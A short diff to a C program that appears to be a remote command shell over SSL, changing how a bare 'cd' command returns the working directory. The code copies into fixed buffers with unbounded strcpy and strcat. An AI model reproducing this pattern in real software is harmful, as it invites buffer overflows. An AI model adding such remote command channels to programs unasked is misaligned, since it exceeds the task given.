@@ -216,8 +216,22 @@ int main(void)
                     }
                     else
                     {
-                        printf("debug:cd %s!\n", part2);
+
+                        if (part2 == NULL)
+                        {
+                            char dir[4096];
+                            strcpy(response_buffer, "now in:");
+                            getcwd(dir, 4096);
+                            strcat(response_buffer, dir);
+                            cmd_ytp.setArgs("CMD", "ACTIVE", CMD, strlen(response_buffer) + 1);
+                            strcpy(cmd_buffer, cmd_ytp.content);
+                            strcat(cmd_buffer, response_buffer);
+                            n = SSL_write(ssl, cmd_buffer, strlen(cmd_buffer) + 1);
+                            SSL_ERR_ACTION(n, "ssl write failed in 208", ssl);
+                            continue;
+                        }
                         int res_cd = chdir(part2);
+                        printf("debug:cd %s!\n", part2);
                         if (res_cd < 0)
                         {
                             strcpy(response_buffer, strerror(errno));
